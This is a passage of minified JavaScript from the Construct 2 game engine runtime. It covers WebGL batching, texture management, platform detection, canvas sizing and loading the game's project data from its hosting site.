g=h.left,f=h.top,m=h.right,h=h.bottom;this.enableFrontToBack?(u[c++]=t,u[c++]=e,u[c++]=d,u[c++]=i,u[c++]=s,u[c++]=d,u[c++]=n,u[c++]=r,u[c++]=d,u[c++]=o,u[c++]=a,u[c++]=d):(u[c++]=t,u[c++]=e,u[c++]=i,u[c++]=s,u[c++]=n,u[c++]=r,u[c++]=o,u[c++]=a),p[l++]=g,p[l++]=f,p[l++]=m,p[l++]=f,p[l++]=m,p[l++]=h,p[l++]=g,p[l++]=h,this.vertexPtr=c,this.texPtr=l},t.prototype.quadTexUV=function(t,e,i,s,n,r,o,a,h,c,l,u,p,d,g,f){15992<=this.vertexPtr&&this.endBatch();var m,y=this.vertexPtr,_=this.texPtr,v=this.vertexData,b=this.texcoordData,w=this.currentZ;this.hasQuadBatchTop?this.batch[this.batchPtr-1].indexCount+=6:((m=this.pushBatch()).type=1,m.startIndex=this.enableFrontToBack?y:y/2*3,m.indexCount=6,this.hasQuadBatchTop=!0,this.hasPointBatchTop=!1),this.enableFrontToBack?(v[y++]=t,v[y++]=e,v[y++]=w,v[y++]=i,v[y++]=s,v[y++]=w,v[y++]=n,v[y++]=r,v[y++]=w,v[y++]=o,v[y++]=a,v[y++]=w):(v[y++]=t,v[y++]=e,v[y++]=i,v[y++]=s,v[y++]=n,v[y++]=r,v[y++]=o,v[y++]=a),b[_++]=h,b[_++]=c,b[_++]=l,b[_++]=u,b[_++]=p,b[_++]=d,b[_++]=g,b[_++]=f,this.vertexPtr=y,this.texPtr=_},t.prototype.convexPoly=function(t){for(var e,i,s,n,r,o,a=t.length/2-2,h=a-1,c=t[0],l=t[1],u=0;u<a;u+=2)e=t[2+(o=2*u)],i=t[3+o],s=t[4+o],n=t[5+o],u===h?this.quad(c,l,e,i,s,n,s,n):(r=t[6+o],o=t[7+o],this.quad(c,l,e,i,s,n,r,o))},t.prototype.point=function(t,e,i,s){7996<=this.pointPtr&&this.endBatch();var n,r=this.pointPtr,o=this.pointData;this.hasPointBatchTop?this.batch[this.batchPtr-1].indexCount++:((n=this.pushBatch()).type=8,n.startIndex=r,n.indexCount=1,this.hasPointBatchTop=!0,this.hasQuadBatchTop=!1),o[r++]=t,o[r++]=e,o[r++]=i,o[r++]=s,this.pointPtr=r},t.prototype.switchProgram=function(t){if(this.lastProgram!==t){var e=this.shaderPrograms[t];if(!e){if(0===this.lastProgram)return;t=0,e=this.shaderPrograms[0]}e=this.pushBatch();e.type=9,e.startIndex=t,this.lastProgram=t,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1}},t.prototype.programUsesDest=function(t){t=this.shaderPrograms[t];return!(!t.locDestStart&&!t.locDestEnd)},t.prototype.programUsesCrossSampling=function(t){t=this.shaderPrograms[t];return!!(t.locDestStart||t.locDestEnd||t.crossSampling)},t.prototype.programPreservesOpaqueness=function(t){return this.shaderPrograms[t].preservesOpaqueness},t.prototype.programExtendsBox=function(t){t=this.shaderPrograms[t];return 0!==t.extendBoxHorizontal||0!==t.extendBoxVertical},t.prototype.getProgramBoxExtendHorizontal=function(t){return this.shaderPrograms[t].extendBoxHorizontal},t.prototype.getProgramBoxExtendVertical=function(t){return this.shaderPrograms[t].extendBoxVertical},t.prototype.getProgramParameterType=function(t,e){return this.shaderPrograms[t].parameters[e][2]},t.prototype.programIsAnimated=function(t){return this.shaderPrograms[t].animated},t.prototype.setProgramParameters=function(t,e,i,s,n,r,o,a,h,c,l,u,p,d,g){var f,m,y,_,v,b=this.shaderPrograms[this.lastProgram];if(b.hasAnyOptionalUniforms||g.length){if((y=this.pushBatch()).type=10,y.mat4param?mat4.set(this.matMV,y.mat4param):y.mat4param=mat4.create(),(_=y.mat4param)[0]=e,_[1]=i,_[2]=s,_[3]=n,_[4]=r,_[5]=o,_[6]=a,_[7]=h,_[8]=c,_[9]=l,_[10]=u,_[11]=p,_[12]=d,b.locSamplerBack?y.texParam=t:y.texParam=null,g.length)for((v=y.shaderParams).length=g.length,f=0,m=g.length;f<m;f++)v[f]=g[f];this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1}},t.prototype.clear=function(t,e,i,s){var n=this.pushBatch();n.type=7,n.startIndex=0,n.mat4param||(n.mat4param=mat4.create()),n.mat4param[0]=t,n.mat4param[1]=e,n.mat4param[2]=i,n.mat4param[3]=s,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1},t.prototype.clearRect=function(t,e,i,s){var n;i<0||s<0||((n=this.pushBatch()).type=7,n.startIndex=1,n.mat4param||(n.mat4param=mat4.create()),n.mat4param[0]=t,n.mat4param[1]=e,n.mat4param[2]=i,n.mat4param[3]=s,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1)},t.prototype.clearDepth=function(){var t=this.pushBatch();t.type=7,t.startIndex=2,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1},t.prototype.setEarlyZPass=function(t){var e;this.enableFrontToBack&&(t=!!t,this.isEarlyZPass!==t&&((e=this.pushBatch()).type=14,e.startIndex=t?1:0,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1,this.isEarlyZPass=t,this.renderToTex=null,this.isEarlyZPass?this.switchProgram(2):this.switchProgram(0)))},t.prototype.setDepthTestEnabled=function(t){var e;this.enableFrontToBack&&((e=this.pushBatch()).type=13,e.startIndex=t?1:0,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1)},t.prototype.fullscreenQuad=function(){mat4.set(this.lastMV,i),this.resetModelView(),this.updateModelView();var t=this.width/2,e=this.height/2;this.quad(-t,e,t,e,t,-e,-t,-e),mat4.set(i,this.matMV),this.updateModelView()},t.prototype.setColorFillMode=function(t,e,i,s){this.switchProgram(3);var n=this.pushBatch();n.type=12,n.mat4param||(n.mat4param=mat4.create()),n.mat4param[0]=t,n.mat4param[1]=e,n.mat4param[2]=i,n.mat4param[3]=s,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1},t.prototype.setTextureFillMode=function(){this.switchProgram(0)},t.prototype.restoreEarlyZMode=function(){this.switchProgram(2)},t.prototype.present=function(){this.endBatch(),this.gl.flush()};var g=[],f={};t.prototype.contextLost=function(){cr.clearArray(g),f={}},t.prototype.loadTexture=function(t,e,i,s,n,r){e=!!e,i=!!i;var o=t.src+","+e+","+i+(e?","+n:""),a=null;if(void 0!==t.src&&f.hasOwnProperty(o))return(a=f[o]).c2refcount++,a;this.endBatch();var h=this.gl,c=cr.isPOT(t.width)&&cr.isPOT(t.height),a=h.createTexture();h.bindTexture(h.TEXTURE_2D,a),h.pixelStorei(h.UNPACK_PREMULTIPLY_ALPHA_WEBGL,!0);var l,u=h.RGBA,p=h.RGBA,d=h.UNSIGNED_BYTE;if(s&&!this.isIE)switch(s){case 1:u=h.RGB,p=h.RGB;break;case 2:d=h.UNSIGNED_SHORT_4_4_4_4;break;case 3:d=h.UNSIGNED_SHORT_5_5_5_1;break;case 4:u=h.RGB,p=h.RGB,d=h.UNSIGNED_SHORT_5_6_5}return 1===this.version&&!c&&e?((l=document.createElement("canvas")).width=cr.nextHighestPowerOfTwo(t.width),l.height=cr.nextHighestPowerOfTwo(t.height),void 0!==(s=l.getContext("2d")).imageSmoothingEnabled?s.imageSmoothingEnabled=i:(s.webkitImageSmoothingEnabled=i,s.mozImageSmoothingEnabled=i,s.msImageSmoothingEnabled=i),s.drawImage(t,0,0,t.width,t.height,0,0,l.width,l.height),h.texImage2D(h.TEXTURE_2D,0,u,p,d,l)):h.texImage2D(h.TEXTURE_2D,0,u,p,d,t),e?"repeat-x"===n?(h.texParameteri(h.TEXTURE_2D,h.TEXTURE_WRAP_S,h.REPEAT),h.texParameteri(h.TEXTURE_2D,h.TEXTURE_WRAP_T,h.CLAMP_TO_EDGE)):("repeat-y"===n?h.texParameteri(h.TEXTURE_2D,h.TEXTURE_WRAP_S,h.CLAMP_TO_EDGE):h.texParameteri(h.TEXTURE_2D,h.TEXTURE_WRAP_S,h.REPEAT),h.texParameteri(h.TEXTURE_2D,h.TEXTURE_WRAP_T,h.REPEAT)):(h.texParameteri(h.TEXTURE_2D,h.TEXTURE_WRAP_S,h.CLAMP_TO_EDGE),h.texParameteri(h.TEXTURE_2D,h.TEXTURE_WRAP_T,h.CLAMP_TO_EDGE)),i?(h.texParameteri(h.TEXTURE_2D,h.TEXTURE_MAG_FILTER,h.LINEAR),(c||2<=this.version)&&this.enable_mipmaps&&!r?(h.texParameteri(h.TEXTURE_2D,h.TEXTURE_MIN_FILTER,h.LINEAR_MIPMAP_LINEAR),h.generateMipmap(h.TEXTURE_2D)):h.texParameteri(h.TEXTURE_2D,h.TEXTURE_MIN_FILTER,h.LINEAR)):(h.texParameteri(h.TEXTURE_2D,h.TEXTURE_MAG_FILTER,h.NEAREST),h.texParameteri(h.TEXTURE_2D,h.TEXTURE_MIN_FILTER,h.NEAREST)),h.bindTexture(h.TEXTURE_2D,null),this.lastTexture0=null,a.c2width=t.width,a.c2height=t.height,a.c2refcount=1,a.c2texkey=o,g.push(a),f[o]=a},t.prototype.createEmptyTexture=function(t,e,i,s,n){this.endBatch();var r=this.gl;this.isIE&&(s=!1);var o=r.createTexture();return r.bindTexture(r.TEXTURE_2D,o),r.texImage2D(r.TEXTURE_2D,0,r.RGBA,t,e,0,r.RGBA,s?r.UNSIGNED_SHORT_4_4_4_4:r.UNSIGNED_BYTE,null),n?(r.texParameteri(r.TEXTURE_2D,r.TEXTURE_WRAP_S,r.REPEAT),r.texParameteri(r.TEXTURE_2D,r.TEXTURE_WRAP_T,r.REPEAT)):(r.texParameteri(r.TEXTURE_2D,r.TEXTURE_WRAP_S,r.CLAMP_TO_EDGE),r.texParameteri(r.TEXTURE_2D,r.TEXTURE_WRAP_T,r.CLAMP_TO_EDGE)),r.texParameteri(r.TEXTURE_2D,r.TEXTURE_MAG_FILTER,i?r.LINEAR:r.NEAREST),r.texParameteri(r.TEXTURE_2D,r.TEXTURE_MIN_FILTER,i?r.LINEAR:r.NEAREST),r.bindTexture(r.TEXTURE_2D,null),this.lastTexture0=null,o.c2width=t,o.c2height=e,g.push(o),o},t.prototype.videoToTexture=function(t,e,i){this.endBatch();var s=this.gl;this.isIE&&(i=!1),s.bindTexture(s.TEXTURE_2D,e),s.pixelStorei(s.UNPACK_PREMULTIPLY_ALPHA_WEBGL,!0);try{s.texImage2D(s.TEXTURE_2D,0,s.RGBA,s.RGBA,i?s.UNSIGNED_SHORT_4_4_4_4:s.UNSIGNED_BYTE,t)}catch(t){console&&console.error&&console.error("Error updating WebGL texture: ",t)}s.bindTexture(s.TEXTURE_2D,null),this.lastTexture0=null},t.prototype.deleteTexture=function(t){t&&(void 0!==t.c2refcount&&1<t.c2refcount?t.c2refcount--:(this.endBatch(),t===this.lastTexture0&&(this.gl.bindTexture(this.gl.TEXTURE_2D,null),this.lastTexture0=null),t===this.lastTexture1&&(this.gl.activeTexture(this.gl.TEXTURE1),this.gl.bindTexture(this.gl.TEXTURE_2D,null),this.gl.activeTexture(this.gl.TEXTURE0),this.lastTexture1=null),cr.arrayFindRemove(g,t),void 0!==t.c2texkey&&delete f[t.c2texkey],this.gl.deleteTexture(t)))},t.prototype.estimateVRAM=function(){for(var t,e=this.width*this.height*4*2,i=0,s=g.length;i<s;i++)e+=(t=g[i]).c2width*t.c2height*4;return e},t.prototype.textureCount=function(){return g.length},t.prototype.setRenderingToTexture=function(t){var e;t!==this.renderToTex&&((e=this.pushBatch()).type=6,e.texParam=t,this.renderToTex=t,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1)},cr.GLWrap=t}(),function(){var u=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame||window.oRequestAnimationFrame;function i(t){var e;t&&(t.getContext||t.dc)&&(t.c2runtime||((e=t.c2runtime=this).isCrosswalk=/crosswalk/i.test(navigator.userAgent)||/xwalk/i.test(navigator.userAgent)||!(void 0===window.c2isCrosswalk||!window.c2isCrosswalk),this.isCordova=this.isCrosswalk||void 0!==window.device&&(void 0!==window.device.cordova||void 0!==window.device.phonegap)||void 0!==window.c2iscordova&&window.c2iscordova,this.isPhoneGap=this.isCordova,this.isDirectCanvas=!!t.dc,this.isAppMobi=void 0!==window.AppMobi||this.isDirectCanvas,this.isCocoonJs=!!window.c2cocoonjs,this.isEjecta=!!window.c2ejecta,this.isCocoonJs&&(CocoonJS.App.onSuspended.addEventListener(function(){e.setSuspended(!0)}),CocoonJS.App.onActivated.addEventListener(function(){e.setSuspended(!1)})),this.isEjecta&&(document.addEventListener("pagehide",function(){e.setSuspended(!0)}),document.addEventListener("pageshow",function(){e.setSuspended(!1)}),document.addEventListener("resize",function(){e.setSize(window.innerWidth,window.innerHeight)})),this.isDomFree=this.isDirectCanvas||this.isCocoonJs||this.isEjecta,this.isMicrosoftEdge=/edge\//i.test(navigator.userAgent),this.isIE=(/msie/i.test(navigator.userAgent)||/trident/i.test(navigator.userAgent)||/iemobile/i.test(navigator.userAgent))&&!this.isMicrosoftEdge,this.isTizen=/tizen/i.test(navigator.userAgent),this.isAndroid=/android/i.test(navigator.userAgent)&&!this.isTizen&&!this.isIE&&!this.isMicrosoftEdge,this.isiPhone=(/iphone/i.test(navigator.userAgent)||/ipod/i.test(navigator.userAgent))&&!this.isIE&&!this.isMicrosoftEdge,this.isiPad=/ipad/i.test(navigator.userAgent),this.isiOS=this.isiPhone||this.isiPad||this.isEjecta,this.isiPhoneiOS6=this.isiPhone&&/os\s6/i.test(navigator.userAgent),this.isChrome=(/chrome/i.test(navigator.userAgent)||/chromium/i.test(navigator.userAgent))&&!this.isIE&&!this.isMicrosoftEdge,this.isAmazonWebApp=/amazonwebappplatform/i.test(navigator.userAgent),this.isFirefox=/firefox/i.test(navigator.userAgent),this.isSafari=/safari/i.test(navigator.userAgent)&&!this.isChrome&&!this.isIE&&!this.isMicrosoftEdge,this.isWindows=/windows/i.test(navigator.userAgent),this.isNWjs=void 0!==window.c2nodewebkit||void 0!==window.c2nwjs||/nodewebkit/i.test(navigator.userAgent)||/nwjs/i.test(navigator.userAgent),this.isNodeWebkit=this.isNWjs,this.isArcade=void 0!==window.is_scirra_arcade,this.isWindows8App=!(void 0===window.c2isWindows8||!window.c2isWindows8),this.isWindows8Capable=!(void 0===window.c2isWindows8Capable||!window.c2isWindows8Capable),this.isWindowsPhone8=!(void 0===window.c2isWindowsPhone8||!window.c2isWindowsPhone8),this.isWindowsPhone81=!(void 0===window.c2isWindowsPhone81||!window.c2isWindowsPhone81),this.isWindows10=!!window.cr_windows10,this.isWinJS=this.isWindows8App||this.isWindows8Capable||this.isWindowsPhone81||this.isWindows10,this.isBlackberry10=!(void 0===window.c2isBlackberry10||!window.c2isBlackberry10),this.isAndroidStockBrowser=this.isAndroid&&!this.isChrome&&!this.isCrosswalk&&!this.isFirefox&&!this.isAmazonWebApp&&!this.isDomFree,this.devicePixelRatio=1,this.isMobile=this.isCordova||this.isCrosswalk||this.isAppMobi||this.isCocoonJs||this.isAndroid||this.isiOS||this.isWindowsPhone8||this.isWindowsPhone81||this.isBlackberry10||this.isTizen||this.isEjecta,this.isMobile||(this.isMobile=/(blackberry|bb10|playbook|palm|symbian|nokia|windows\s+ce|phone|mobile|tablet|kindle|silk)/i.test(navigator.userAgent)),this.isWKWebView=!!(this.isiOS&&this.isCordova&&window.webkit),"undefined"==typeof cr_is_preview||this.isNWjs||"?nw"!==window.location.search&&!/nodewebkit/i.test(navigator.userAgent)&&!/nwjs/i.test(navigator.userAgent)||(this.isNWjs=!0),this.isDebug="undefined"!=typeof cr_is_preview&&-1<window.location.search.indexOf("debug"),this.canvas=t,this.canvasdiv=document.getElementById("c2canvasdiv"),this.gl=null,this.glwrap=null,this.glUnmaskedRenderer="(unavailable)",this.enableFrontToBack=!1,this.earlyz_index=0,this.ctx=null,this.firstInFullscreen=!1,this.oldWidth=0,this.oldHeight=0,this.canvas.oncontextmenu=function(t){return t.preventDefault&&t.preventDefault(),!1},this.canvas.onselectstart=function(t){return t.preventDefault&&t.preventDefault(),!1},this.canvas.ontouchstart=function(t){return t.preventDefault&&t.preventDefault(),!1},this.isDirectCanvas&&(window.c2runtime=this),this.isNWjs&&(window.ondragover=function(t){return t.preventDefault(),!1},window.ondrop=function(t){return t.preventDefault(),!1},window.nwgui&&window.nwgui.App.clearCache&&window.nwgui.App.clearCache()),this.isAndroidStockBrowser&&"undefined"!=typeof jQuery&&jQuery("canvas").parents("*").css("overflow","visible"),this.width=t.width,this.height=t.height,this.draw_width=this.width,this.draw_height=this.height,this.cssWidth=this.width,this.cssHeight=this.height,this.lastWindowWidth=window.innerWidth,this.lastWindowHeight=window.innerHeight,this.forceCanvasAlpha=!1,this.redraw=!0,this.isSuspended=!1,Date.now||(Date.now=function(){return+new Date}),this.plugins=[],this.types={},this.types_by_index=[],this.behaviors=[],this.layouts={},this.layouts_by_index=[],this.eventsheets={},this.eventsheets_by_index=[],this.wait_for_textures=[],this.triggers_to_postinit=[],this.all_global_vars=[],this.all_local_vars=[],this.solidBehavior=null,this.jumpthruBehavior=null,this.shadowcasterBehavior=null,this.deathRow={},this.hasPendingInstances=!1,this.isInClearDeathRow=!1,this.isInOnDestroy=0,this.isRunningEvents=!1,this.isEndingLayout=!1,this.createRow=[],this.isLoadingState=!1,this.saveToSlot="",this.loadFromSlot="",this.loadFromJson=null,this.lastSaveJson="",this.signalledContinuousPreview=!1,this.suspendDrawing=!1,this.fireOnCreateAfterLoad=[],this.dt=0,this.dt1=0,this.minimumFramerate=30,this.logictime=0,this.cpuutilisation=0,this.timescale=1,this.kahanTime=new cr.KahanAdder,this.wallTime=new cr.KahanAdder,this.last_tick_time=0,this.fps=0,this.last_fps_time=0,this.tickcount=0,this.tickcount_nosave=0,this.execcount=0,this.framecount=0,this.objectcount=0,this.changelayout=null,this.destroycallbacks=[],this.event_stack=[],this.event_stack_index=-1,this.localvar_stack=[[]],this.localvar_stack_index=0,this.trigger_depth=0,this.pushEventStack(null),this.loop_stack=[],this.loop_stack_index=-1,this.next_uid=0,this.next_puid=0,this.layout_first_tick=!0,this.family_count=0,this.suspend_events=[],this.raf_id=-1,this.timeout_id=-1,this.isloading=!0,this.loadingprogress=0,this.isNodeFullscreen=!1,this.stackLocalCount=0,this.audioInstance=null,this.had_a_click=!1,this.isInUserInputEvent=!1,this.objects_to_pretick=new cr.ObjectSet,this.objects_to_tick=new cr.ObjectSet,this.objects_to_tick2=new cr.ObjectSet,this.registered_collisions=[],this.temp_poly=new cr.CollisionPoly([]),this.temp_poly2=new cr.CollisionPoly([]),this.allGroups=[],this.groups_by_name={},this.cndsBySid={},this.actsBySid={},this.varsBySid={},this.blocksBySid={},this.running_layout=null,this.layer_canvas=null,this.layer_ctx=null,this.layer_tex=null,this.layout_tex=null,this.layout_canvas=null,this.layout_ctx=null,this.is_WebGL_context_lost=!1,this.uses_background_blending=!1,this.fx_tex=[null,null],this.fullscreen_scaling=0,this.files_subfolder="",this.objectsByUid={},this.loaderlogos=null,this.snapshotCanvas=null,this.snapshotData="",this.objectRefTable=[],this.requestProjectData()))}i.prototype.requestProjectData=function(){var e=this;if(this.isWKWebView)this.fetchLocalFileViaCordovaAsText("https://427396048-642845047394716217.preview.editmysite.com/uploads/b/139890129-761103484729797659/files/data.js",function(t){e.loadProject(JSON.parse(t))},function(t){alert("Error fetching data.js")});else{var i=this.isWindowsPhone8?new ActiveXObject("Microsoft.XMLHTTP"):new XMLHttpRequest,s="https://427396048-642845047394716217.preview.editmysite.com/uploads/b/139890129-761103484729797659/files/data.js";(this.isWindows8App||this.isWindowsPhone8||this.isWindowsPhone81||this.isWindows10)&&(s="data.json"),i.open("GET",s,!0);var n=!1;if(!this.isDomFree&&"response"in i&&"responseType"in i)try{i.responseType="json",n="json"===i.responseType}catch(t){n=!1}if(!n&&"responseType"in i)try{i.responseType="text"}catch(t){}if("overrideMimeType"in i)try{i.overrideMimeType("application/json; charset=utf-8")}catch(t){}this.isWindowsPhone8?i.onreadystatechange=function(){4===i.readyState&&e.loadProject(JSON.parse(i.responseText))}:(i.onload=function(){var t;n?e.loadProject(i.response):e.isEjecta?(t=(t=i.responseText).substr(t.indexOf("{")),e.loadProject(JSON.parse(t))):e.loadProject(JSON.parse(i.responseText))},i.onerror=function(t){cr.logerror("Error requesting "+s+":"),cr.logerror(t)}),i.send()}},i.prototype.initRendererAndLoader=function(){var t,e,i,s,n,r,o,a,h,c,l,u=this;this.isRetina=(!this.isDomFree||this.isEjecta||this.isCordova)&&this.useHighDpi&&!this.isAndroidStockBrowser,0===this.fullscreen_mode&&this.isiOS&&(this.isRetina=!1),this.devicePixelRatio=this.isRetina&&(window.devicePixelRatio||window.webkitDevicePixelRatio||window.mozDevicePixelRatio||window.msDevicePixelRatio)||1,"object"==typeof window.StatusBar&&window.StatusBar.hide(),this.ClearDeathRow(),0<this.fullscreen_mode&&this.setSize(window.innerWidth,window.innerHeight,!0),this.canvas.addEventListener("webglcontextlost",function(t){t.preventDefault(),u.onContextLost(),cr.logexport("[Construct 2] WebGL context lost"),window.cr_setSuspended(!0)},!1),this.canvas.addEventListener("webglcontextrestored",function(t){u.glwrap.initState(),u.glwrap.setSize(u.glwrap.width,u.glwrap.height,!0),u.layer_tex=null,u.layout_tex=null,u.fx_tex[0]=null,u.fx_tex[1]=null,u.onContextRestored(),u.redraw=!0,cr.logexport("[Construct 2] WebGL context restored"),window.cr_setSuspended(!1)},!1);try{this.enableWebGL&&(this.isCocoonJs||this.isEjecta||!this.isDomFree)&&(l={alpha:!0,depth:!1,antialias:!1,powerPreference:"high-performance",failIfMajorPerformanceCaveat:!0},this.isAndroid||(this.gl=this.canvas.getContext("webgl2",l)),this.gl||(this.gl=this.canvas.getContext("webgl",l)||this.canvas.getContext("experimental-webgl",l)))}catch(t){}if(this.gl){this.gl.getParameter(this.gl.VERSION).indexOf("WebGL 2");var p,d=this.gl.getExtension("WEBGL_debug_renderer_info");for(d&&(p=this.gl.getParameter(d.UNMASKED_VENDOR_WEBGL),d=this.gl.getParameter(d.UNMASKED_RENDERER_WEBGL),this.glUnmaskedRenderer=d+" ["+p+"]"),this.enableFrontToBack&&(this.glUnmaskedRenderer+=" [front-to-back enabled]"),this.isDomFree||(this.overlay_canvas=document.createElement("canvas"),jQuery(this.overlay_canvas).appendTo(this.canvas.parentNode),this.overlay_canvas.oncontextmenu=function(t){return!1},this.overlay_canvas.onselectstart=function(t){return!1},this.overlay_canvas.width=Math.round(this.cssWidth*this.devicePixelRatio),this.overlay_canvas.height=Math.round(this.cssHeight*this.devicePixelRatio),jQuery(this.overlay_canvas).css({width:this.cssWidth+"px",height:this.cssHeight+"px"}),this.positionOverlayCanvas(),this.overlay_ctx=this.overlay_canvas.getContext("2d")),this.glwrap=new cr.GLWrap(this.gl,this.isMobile,this.enableFrontToBack),this.glwrap.setSize(this.canvas.width,this.canvas.height),this.glwrap.enable_mipmaps=0!==this.downscalingQuality,this.ctx=null,t=0,e=this.types_by_index.length;t<e;t++)for(i=0,s=(o=this.types_by_index[t]).effect_types.length;i<s;i++)(a=o.effect_types[i]).shaderindex=this.glwrap.getShaderIndex(a.id),a.preservesOpaqueness=this.glwrap.programPreservesOpaqueness(a.shaderindex),this.uses_background_blending=this.uses_background_blending||this.glwrap.programUsesDest(a.shaderindex);for(t=0,e=this.layouts_by_index.length;t<e;t++){for(i=0,s=(h=this.layouts_by_index[t]).effect_types.length;i<s;i++)(a=h.effect_types[i]).shaderindex=this.glwrap.getShaderIndex(a.id),a.preservesOpaqueness=this.glwrap.programPreservesOpaqueness(a.shaderindex);for(h.updateActiveEffects(),i=0,s=h.layers.length;i<s;i++){for(n=0,r=(c=h.layers[i]).effect_types.length;n<r;n++)(a=c.effect_types[n]).shaderindex=this.glwrap.getShaderIndex(a.id),a.preservesOpaqueness=this.glwrap.programPreservesOpaqueness(a.shaderindex),this.uses_background_blending=this.uses_background_blending||this.glwrap.programUsesDest(a.shaderindex);c.updateActiveEffects()}}}else{if(0<this.fullscreen_mode&&this.isDirectCanvas){this.canvas=null,document.oncontextmenu=function(t){return!1},document.onselectstart=function(t){return!1},this.ctx=AppMobi.canvas.getContext("2d");try{this.ctx.samplingMode=this.linearSampling?"smooth":"sharp",this.ctx.globalScale=1,this.ctx.HTML5CompatibilityMode=!0,this.ctx.imageSmoothingEnabled=this.linearSampling}catch(t){}0!==this.width&&0!==this.height&&(this.ctx.width=this.width,this.ctx.height=this.height)}this.ctx||(l=this.isCocoonJs?{antialias:!!this.linearSampling,alpha:!0}:{alpha:!0},this.ctx=this.canvas.getContext("2d",l),this.setCtxImageSmoothingEnabled(this.ctx,this.linearSampling)),this.overlay_canvas=null,this.overlay_ctx=null}this.tickFunc=function(t){u.tick(!1,t)},window==window.top||this.isDomFree||this.isWinJS||this.isWindowsPhone8||(document.addEventListener("mousedown",function(){window.focus()},!0),document.addEventListener("touchstart",function(){window.focus()},!0)),"undefined"!=typeof cr_is_preview&&(this.isCocoonJs&&console.log("[Construct 2] In preview-over-wifi via CocoonJS mode"),-1<window.location.search.indexOf("continuous")&&(cr.logexport("Reloading for continuous preview"),this.loadFromSlot="__c2_continuouspreview",this.suspendDrawing=!0),this.pauseOnBlur&&!this.isMobile&&(jQuery(window).focus(function(){u.setSuspended(!1)}),jQuery(window).blur(function(){var t=window.parent;t&&t.document.hasFocus()||u.setSuspended(!0)}))),window.addEventListener("blur",function(){u.onWindowBlur()}),this.isDomFree||(p=function(t){if(cr.isCanvasInputEvent(t)&&document.activeElement&&document.activeElement!==document.getElementsByTagName("body")[0]&&document.activeElement.blur)try{document.activeElement.blur()}catch(t){}},"undefined"!=typeof PointerEvent?document.addEventListener("pointerdown",p):window.navigator.msPointerEnabled?document.addEventListener("MSPointerDown",p):document.addEventListener("touchstart",p),document.addEventListener("mousedown",p)),0===this.fullscreen_mode&&this.isRetina&&1<this.devicePixelRatio&&this.setSize(this.original_width,this.original_height,!0),this.tryLockOrientation(),this.getready(),this.go(),this.extra={},cr.seal(this)},i.prototype.setSize=function(t,e,i){var s,n,r,o,a=0,h=0,c=0,l=0,u=0;this.lastWindowWidth===t&&this.lastWindowHeight===e&&!i||(this.lastWindowWidth=t,this.lastWindowHeight=e,s=this.fullscreen_mode,((o=(document.mozFullScreen||document.webkitIsFullScreen||!!document.msFullscreenElement||document.fullScreen||this.isNodeFullscreen)&&!this.isCordova)||0!==this.fullscreen_mode||i)&&(o&&(s=this.fullscreen_scaling),i=this.devicePixelRatio,4<=s?(5===s&&1!==i&&(t+=1,e+=1),(n=this.original_width/this.original_height)<(r=t/e)?(c=e*n,5===s?(1<(u=c*i/this.original_width)?u=Math.floor(u):u<1&&(u=1/Math.ceil(1/u)),a=(t-(c=this.original_width*u/i))/2,h=(e-(l=this.original_height*u/i))/2,t=c,e=l):(a=(t-c)/2,t=c)):(l=t/n,e=(5===s?(1<(u=l*i/this.original_height)?u=Math.floor(u):u<1&&(u=1/Math.ceil(1/u)),a=(t-(c=this.original_width*u/i))/2,h=(e-(l=this.original_height*u/i))/2,t=c):h=(e-l)/2,l))):o&&0===s&&(a=Math.floor((t-this.original_width)/2),h=Math.floor((e-this.original_height)/2),t=this.original_width,e=this.original_height),s<2&&(this.aspect_scale=i),this.cssWidth=Math.round(t),this.cssHeight=Math.round(e),this.width=Math.round(t*i),this.height=Math.round(e*i),this.redraw=!0,this.wantFullscreenScalingQuality||this.width<this.original_width&&this.height<this.original_height||1===s?(this.draw_width=this.width,this.draw_height=this.height,this.fullscreenScalingQuality=!0):(this.draw_width=this.original_width,this.draw_height=this.original_height,this.fullscreenScalingQuality=!1,2===s?(n=this.original_width/this.original_height,(r=this.lastWindowWidth/this.lastWindowHeight)<n?this.draw_width=this.draw_height*r:n<r&&(this.draw_height=this.draw_width/r)):3===s&&((n=this.original_width/this.original_height)<(r=this.lastWindowWidth/this.lastWindowHeight)?this.draw_width=this.draw_height*r:r<n&&(this.draw_height=this.draw_width/r))),this.canvasdiv&&!this.isDomFree&&(jQuery(this.canvasdiv).css({width:Math.round(t)+"px",height:Math.round(e)+"px","margin-left":Math.floor(a)+"px","margin-top":Math.floor(h)+"px"}),"undefined"!=typeof cr_is_preview&&jQuery("#borderwrap").css({width:Math.round(t)+"px",height:Math.round(e)+"px"})),this.canvas&&(this.canvas.width=Math.round(t*i),this.canvas.height=Math.round(e*i),this.isEjecta?(this.canvas.style.left=Math.floor(a)+"px",this.canvas.style.top=Math.floor(h)+"px",this.canvas.style.width=Math.round(t)+"px",this.canvas.style.height=Math.round(e)+"px"):this.isRetina&&!this.isDomFree&&(this.canvas.style.width=Math.round(t)+"px",this.canvas.style.height=Math.round(e)+"px")),this.overlay_canvas&&(this.overlay_canvas.width=Math.round(t*i),this.overlay_canvas.height=Math.round(e*i),this.overlay_canvas.style.width=this.cssWidth+"px",this.overlay_canvas.style.height=this.cssHeight+"px"),this.glwrap&&this.glwrap.setSize(Math.round(t*i),Math.round(e*i)),this.isDirectCanvas&&this.ctx&&(this.ctx.width=Math.round(t),this.ctx.height=Math.round(e)),this.ctx&&this.setCtxImageSmoothingEnabled(this.ctx,this.linearSampling),this.tryLockOrientation(),this.isiPhone&&!this.isCordova&&window.scrollTo(0,0)))},i.prototype.tryLockOrientation=function(){if(this.autoLockOrientation&&0!==this.orientations){var t="portrait";2===this.orientations&&(t="landscape");try{screen.orientation&&screen.orientation.lock?screen.orientation.lock(t).catch(function(){}):screen.lockOrientation?screen.lockOrientation(t):screen.webkitLockOrientation?screen.webkitLockOrientation(t):screen.mozLockOrientation?screen.mozLockOrientation(t):screen.msLockOrientation&&screen.msLockOrientation(t)}catch(t){console&&console.warn&&console.warn("Failed to lock orientation: ",t)}}},i.prototype.onContextLost=function(){var 